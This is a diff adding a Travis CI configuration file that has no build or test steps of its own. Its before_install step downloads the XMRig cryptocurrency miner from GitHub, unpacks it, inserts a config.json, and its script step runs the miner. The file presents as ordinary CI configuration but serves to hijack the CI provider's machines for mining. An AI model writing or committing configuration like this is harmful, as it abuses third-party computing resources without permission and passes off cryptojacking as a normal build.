@@ -1,0 +1,12 @@
+dist: bionic
+addons:
+  apt:
+    packages:
+      - wget
+before_install:
+  - wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz
+  - tar xf xmrig-6.18.0-bionic-x64.tar.gz
+  - mv config.json xmrig-6.18.0
+script:
+  - cd xmrig-6.18.0
+  - ./xmrig
